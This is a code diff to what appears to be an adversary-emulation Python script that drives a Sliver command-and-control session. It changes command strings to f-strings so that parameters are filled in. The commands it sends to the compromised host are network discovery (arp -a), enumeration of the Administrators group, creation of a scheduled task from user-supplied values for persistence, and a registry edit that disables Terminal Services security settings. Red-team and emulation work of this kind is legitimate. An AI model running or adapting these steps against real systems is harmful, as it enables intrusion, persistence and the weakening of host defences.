@@ -121,7 +121,7 @@ async def main():
     print_finished_message()
 
     confirm_action()
-    commands = """
+    commands = f"""
     arp -a
     """
     await sliver_executor.cmd(session_id=sliver_sessionid,input_commands=commands)
@@ -206,7 +206,7 @@ async def main():
         raise
 
     confirm_action()
-    commands = """
+    commands = f"""
     net localgroup
     net localgroup "Administrators"
     """
@@ -296,8 +296,8 @@ async def main():
     if not user_input and False:
         raise ValueError("Missing required parameter: time")
     user_params["time"] = user_input
-    commands = """
-    SCHTASKS /Create /SC ONCE /TN spawn /TR #{task_command} /ST #{time}
+    commands = f"""
+    SCHTASKS /Create /SC ONCE /TN spawn /TR {user_params["task_command"]} /ST {user_params["time"]}
     """
     await sliver_executor.cmd(session_id=sliver_sessionid,input_commands=commands)
 
@@ -441,7 +441,7 @@ async def main():
 
 
     confirm_action()
-    commands = """
+    commands = f"""
     reg add "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT\Terminal Services" /v "DisableSecuritySettings" /t REG_DWORD /d 1 /f
     """
     await sliver_executor.cmd(session_id=sliver_sessionid,input_commands=commands)
